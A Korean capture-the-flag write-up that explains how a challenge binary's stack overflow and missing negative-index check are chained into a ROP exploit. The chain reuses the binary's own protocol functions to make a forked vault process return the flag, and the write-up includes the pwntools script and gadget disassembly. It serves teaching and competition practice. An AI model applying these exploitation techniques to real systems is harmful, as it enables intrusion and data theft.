---
title: "Safe House — 암호화된 프로토콜, 해독하지 않고 통과하기"
date: 2026-10-21
tags: ["pwn", "rop", "seccomp", "ipc"]
categories: ["SunshineCTF 2026"]
summary: "플래그를 가진 프로세스와 입력을 받는 프로세스가 분리되어 있고 사이의 프로토콜이 XOR로 덮여 있다. 키를 역산하는 대신 인코딩 함수를 호출한다."
translationKey: "safe-house"
---

## 개요

```
service   amd64, No PIE, Full RELRO, no canary, NX, SHSTK, IBT
```

실행하면 `sh> ` 프롬프트로 명령을 받는다. `PING HELP NOTE RELAY SUBMIT QUIT`.

핵심 구조는 `main`(`FUN_00401290`)에 다 있다. `socketpair` 후 `fork`로 갈라지고, 양쪽이 각자 fd 3으로 서로를 본다.

```
부모 (CLI)                     자식 (금고)
  사용자 입력 파싱                flag.txt fd 보유
  패킷 인코딩 → fd 3              슬롯 테이블 관리
  fd 3 → 응답 디코딩              요청 처리 후 응답
```

## 1. seccomp이 목표를 정해 준다

부모에만 필터가 걸린다. `prctl(PR_SET_NO_NEW_PRIVS)` 후 `syscall(317, ...)`이고, 실패하면 `prctl(PR_SET_SECCOMP, 2)`로 떨어진다.

```
read  write  close  mmap  mprotect  brk  rt_sigreturn  exit_group
```

`open`이 없고 `execve`도 없다. 부모에서 코드 실행을 얻어도 파일을 열 수 없고 셸을 따도 쓸 데가 없다.

반대로 자식은 필터가 없다. `fork` 직후 자식 분기에서 `open`을 세 번 넘게 호출한다.

```c
_DAT_00405084 = open("flag.txt", 0);
_DAT_00405080 = 2;
```

**샌드박스는 내가 장악할 수 있는 쪽에 걸려 있고, 능력은 장악할 수 없는 쪽에 있다.** 그래서 목표가 "셸 획득"이 아니라 "자식에게 올바른 요청 보내기"로 바뀐다. 이후 모든 판단이 여기서 갈린다.

## 2. 프로토콜

### 프레임

`FUN_00401d50`이 송신 함수다. 인자는 `(opcode, buf, len)`.

```
[opcode:1][len:2 BE][pad:1]  +  [payload]
```

CRC도 종결자도 없다. 4바이트 헤더와 페이로드를 각각 인코딩해 `write(3, ...)`을 두 번 호출한다.

길이가 빅엔디안인 것만 주의하면 된다.

```c
local_42b = param_3 << 8 | param_3 >> 8;
```

### XOR 계층

`FUN_00401be0(buf, len, key)`이 인코딩이다.

```c
local_4 = param_3 >> 0x18 | (param_3 & 0xff0000) >> 8
        | (param_3 & 0xff00) << 8 | param_3 << 0x18;
...
param_1[lVar1] = param_1[lVar1] ^ *(byte *)((long)&local_4 + (ulong)((uint)lVar1 & 3));
```

키를 바이트 스왑해 지역변수에 담고 `i & 3`으로 인덱싱한다. 리틀엔디안이므로 그 바이트 순서가 원래 키의 MSB→LSB다. 결과적으로 키스트림은 `p32(key, endian='big')`의 4바이트 반복이고, 호출마다 오프셋 0에서 다시 시작한다.

키는 `fork` **전에** 부모 pid로 만든다.

```c
_Var3 = getpid();
uVar4 = ((uint)(_Var3 * 0x45d9f3b) >> 0x10 ^ _Var3 * 0x45d9f3b) * 0x45d9f3b;
DAT_00405060 = uVar4 ^ uVar4 >> 0x10;
```

양쪽이 같은 키를 들고 시작하고, 매 실행 값이 달라진다.

### opcode

자식 루프의 디스패치를 읽으면 네 개다.

| opcode | 동작 |
|---|---|
| 1 | 2바이트 고정 응답 |
| 2 | 다음 public 슬롯에 저장 후 인덱스 반환 |
| 3 | 인덱스로 슬롯 읽기 |
| 4 | `vault: 4 system, N/16 public` |

opcode 2는 인덱스를 고를 수 없다. `DAT_00405064`가 자동으로 증가한다.

opcode 4는 상태 문자열이다. CLI의 `SUBMIT`과는 무관하다.

## 3. 슬롯 테이블과 음수 인덱스

자식의 슬롯은 두 묶음이다.

```
system  0x405080 + k * 0x40c    k = 0..3
public  0x4060b0 + i * 0x40c    i = 0..15
```

`0x4060b0 - 0x405080 = 0x1030 = 0x40c * 4`. system이 public 바로 앞에 붙어 있고 정확히 4칸이다. 즉 public 기준으로 **system은 인덱스 -4 ~ -1**이고, 그 -4가 `flag.txt` 슬롯이다.

슬롯 레이아웃은 `+0x00` 타입, `+0x04` fd, `+0x08` 길이, `+0x0c` 데이터다. 타입 1은 인라인 데이터, 타입 2는 fd 기반이다.

op 3 핸들러의 경계 검사가 이렇다.

```c
else if ((int)local_1038 < 0x10) {
    lVar5 = (long)(int)local_1038 * 0x40c;
    if (*(int *)(&DAT_004060b0 + lVar5) == 1) {
        FUN_00401d50(0, &DAT_004060bc + lVar5, *(undefined2 *)(&DAT_004060b8 + lVar5));
    }
    else if (*(int *)(&DAT_004060b0 + lVar5) == 2) {
        uVar8 = pread(*(int *)(&DAT_004060b4 + lVar5), &local_1438, 0x400, 0);
        ...
```

`(int)` 캐스팅 후 상한만 본다. 하한이 없으니 음수가 통과한다. 인덱스 -4는 타입 2로 잡히고, 자식이 `pread(flag_fd, buf, 0x400, 0)`을 수행해 내용을 응답으로 돌려준다.

**플래그를 읽어달라는 요청이 프로토콜 상으로는 정상 요청이다.** 금고에 침입하는 게 아니라 금고가 원래 하는 일을 시키는 것이다.

그리고 그 힌트가 프로토콜 안에 있다. opcode 4가 `4 system`을 그대로 출력한다.

문제는 보낼 방법이다. 음수 인덱스를 담은 opcode 3 패킷을 만들려면 인코딩을 통과해야 하고, CLI에는 그걸 보내는 명령이 없다. `RELAY`는 op 번호만 받아 길이 0 헤더만 보낸다.

```c
lVar1 = strtol(param_1, (char **)0x0, 10);
if (lVar1 - 1U < 4) {
    local_10c = (undefined1)lVar1;
    local_109 = 0;
    local_10b = 0;
```

페이로드를 실을 자리가 없다. 그래서 두 번째 버그가 필요해진다.

## 4. SUBMIT 오버플로

```c
void FUN_00401ed0(char *param_1)
{
  undefined1 auStack_48 [64];
  ...
  uVar1 = strtol(param_1, (char **)0x0, 10);
  if ((char)uVar1 != '\0') {
    write(1, &DAT_0040302c, 3);
    sVar2 = read(0, auStack_48, uVar1 & 0xff);
```

버퍼 64바이트, 읽는 길이 `uVar1 & 0xff`. 검사는 `(char)uVar1 != 0`이라 하위 바이트가 0인 크기만 거부한다. 255는 통과하고 191바이트 넘친다. 리턴 주소까지 72바이트.

카나리가 없고 No PIE라 그대로 ROP가 열린다.

`read`를 쓰는 것도 중요하다. NUL에서 멈추지 않으므로 주소가 잔뜩 들어간 체인을 그대로 밀어넣을 수 있다.

## 5. 키를 역산하다 그만둔 이유

ROP가 열린 직후 처음 한 일은 키를 꺼내 보는 것이었다. `leak.py`가 그 스크립트다.

```python
chain = flat(
    POP_RDI, STR4,
    STRLEN,
    POP_RDI, 1,
    POP_RSI, KEY_ADDR,
    MOV_RDX_RAX_JMP_WRITE,
    RET,
)
```

`write(1, 0x405060, 4)`로 키 4바이트를 출력하고, 그걸로 보낼 패킷을 미리 계산한다.

```python
header = xor(bytes([3, 0x00, 0x04, 0x00]), stream)
body = xor(p32(0xfffffffc), stream)
```

여기까지 동작했다. 그런데 이 방향은 매 실행마다 키를 다시 뽑아 패킷을 다시 만들어야 하고, 인코딩 함수의 세부를 정확히 재현해야 한다.

`FUN_00401d50`을 그냥 부르면 그 전부가 사라진다. 평문 페이로드를 넘기면 함수가 프레임을 조립하고 인코딩해서 보낸다. 키를 몰라도 된다.

이미 ROP로 임의 함수를 부를 수 있는 상태였으니 선택은 분명했다. 그리고 `leak.py`에서 만든 `strlen` → `mov rdx,rax` 조합이 그대로 재사용된다.

## 6. 체인 조립

### rdx 만들기

`FUN_00401d50(opcode, buf, len)`은 세 번째 인자가 필요한데 `pop rdx` 가젯이 없다. 길이를 반환하는 함수를 경유한다.

```
pop rdi ; ret            → "sh> "
strlen@plt               → rax = 4
mov rdx, rax ; jmp write → rdx = 4
```

`0x4030ba`의 `"sh> "`는 프롬프트 문자열이고 길이가 4다. 이게 두 스크립트 모두에서 필요한 값이다 — `leak.py`는 키 4바이트 출력, `exploit.py`는 4바이트 인덱스 전송.

세 번째 가젯은 따로 찾아낸 바이트 조각이 아니라 `FUN_00401c20`의 뒷부분이다. 이 함수가 프로그램 자신의 문자열 출력 헬퍼다.

```asm
401c20:  push   %rbx
401c21:  mov    %rdi,%rbx
401c24:  call   4011b0 <strlen@plt>
401c29:  mov    %rbx,%rsi
401c2c:  mov    $0x1,%edi
401c31:  pop    %rbx
401c32:  mov    %rax,%rdx
401c35:  jmp    401190 <write@plt>
```

`write(1, s, strlen(s))`를 두 줄로 나눠 끝내는 구조다. `0x401c32`로 진입하면 `rdx = rax` 전달과 `write` 꼬리 점프만 남는다.

진입점이 `pop rbx` 다음이라는 점이 중요하다. 그 `pop`을 건너뛰므로 스택이 밀리지 않고, `rdi`와 `rsi`는 그 앞에서 설정되니 가젯이 덮어쓰지도 않는다. 그래서 체인에서 `rdi = 1`과 `rsi = "sh> "`를 직접 세팅해 넘긴다.

`jmp`로 들어간 `write`의 `ret`이 다음 체인 슬롯을 집어가므로 흐름이 그대로 이어지고, `rdx`도 보존된다. 더미 출력 `write(1, "sh> ", 4)`가 한 번 나가 가짜 프롬프트가 찍히지만 무해하다.

### 페이로드 배치

`FUN_00401d50`에 넘길 버퍼가 고정 주소에 있어야 한다. 스택은 주소가 흔들린다.

CLI의 `NOTE`를 쓴다. 이건 프로토콜 opcode 2와 무관하고, 부모 자신의 BSS 버퍼에 쓰는 명령이다.

```c
uVar7 = strtol(pcVar14 + 5, &local_1438, 10);
if (uVar7 < 8) {
    ...
    pcVar14 = strncpy(&DAT_0040a180 + uVar7 * 0x40, local_1438, 0x3f);
```

슬롯 8개, 간격 `0x40`, 베이스 `0x40a180`. 인덱스는 `strtol` 결과를 `ulong`으로 비교하므로 음수가 막혀 있다.

```python
note(p, 0, p32(0xfffffffc))
note(p, 1, b'1')
```

`strncpy`라서 NUL에서 끊긴다. `p32(0xfffffffc)` = `fc ff ff ff`에 NUL이 없어 4바이트가 온전히 들어간다. 음수 인덱스가 하필 NUL을 포함하지 않는 값이라 이 경로가 성립한다.

### 응답 받기

자식의 응답도 인코딩되어 있다. 수신 함수 `FUN_00401f70`을 체인에 이어 붙이면 디코딩과 출력을 내부에서 다 한다.

여기가 체인에서 가장 비자명한 부분이다. `FUN_00401f70`은 인자로 받은 op 번호를 보내고 **바로** 읽는다.

```c
FUN_00401be0(__buf, 4, DAT_00405060);
write(3, __buf, 4);
sVar2 = read(3, &local_108, 0x100);
if (3 < sVar2) {
    FUN_00401be0(&local_108, sVar2, DAT_00405060);
    uVar3 = (short)local_107 << 8 | (short)local_106;
    if (((local_108 == '\0') && (uVar3 != 0)) && (uVar3 <= (ushort)((short)sVar2 - 4U))) {
        write(1, local_104, ...);
```

그 `read` 시점에 소켓에는 직전 opcode 3 요청의 응답이 이미 들어 있다. 즉 **자기가 보낸 요청의 응답이 아니라 앞서 밀어넣은 요청의 응답을 집어 출력한다.**

그래서 넘기는 `"1"`에는 의미가 없다. `lVar1 - 1U < 4` 검사를 통과할 최소값일 뿐이다. 자식이 요청을 순서대로 처리하므로 타이밍과 무관하게 결정적이다.

## 7. 최종 체인

```python
note(p, 0, p32(0xfffffffc))
note(p, 1, b'1')

chain = flat(
    POP_RDI, STR4,
    STRLEN,
    POP_RDI, 1,
    POP_RSI, STR4,
    MOV_RDX_RAX_JMP_WRITE,
    POP_RDI, 3,
    POP_RSI, NOTES + 0 * 0x40,
    SEND,
    POP_RDI, NOTES + 1 * 0x40,
    RELAY,
)

payload = b'A' * OFFSET + chain
p.sendlineafter(b'sh> ', b'SUBMIT 255')
p.recvuntil(b'GO\n')
p.send(payload.ljust(255, b'\x00'))
```

```
1. rdx = 4                         strlen("sh> ")
2. FUN_00401d50(3, 0x40a180, 4)    opcode 3, 인덱스 -4
3. FUN_00401f70(0x40a1c0)          대기 중인 응답 수신·디코딩·출력
```

암호화된 프로토콜 바이트를 한 개도 직접 만들지 않았다. 프로그램이 가진 함수를 순서만 바꿔 호출한 것이 전부다.

## 짚어둘 점

- 샌드박스와 능력이 다른 프로세스에 있다. 부모에서 할 수 있는 최대가 `write(3, ...)`이고, 그게 정확히 필요한 전부다. seccomp 목록에 `write`가 있는 것이 의도된 경로를 알려준다.
- 암호화 계층을 만났을 때 역산과 우회의 비용 차이가 크다. 바이너리 안에 이미 그 일을 하는 함수가 있으면 호출 가능성만 확보하면 된다. 우회 쪽 체인이 더 길지만(7슬롯 → 16슬롯) 한 번 짜면 실행마다 그대로 쓰인다. 역산 쪽은 매번 키를 뽑아 패킷을 다시 만들어야 한다.
- `strncpy`와 `read`의 차이가 배치 전략을 갈랐다. NOTE는 NUL에서 끊기므로 임의 바이트를 못 깔지만 주소가 고정이고, SUBMIT은 NUL을 통과하지만 스택이다. 둘을 역할대로 나눠 쓴다.
- checksec에 SHSTK와 IBT가 켜져 있다. ROP가 동작했으므로 런타임에서 강제되지 않았다. ELF 속성으로 선언만 되어 있고 커널·CPU 지원과 활성화가 따라오지 않으면 효력이 없다.

---

전체 스크립트: [ctf-writeups/2026-sunshine/safe-house](https://github.com/wjddml/ctf-writeups/tree/main/2026-sunshine/safe-house)
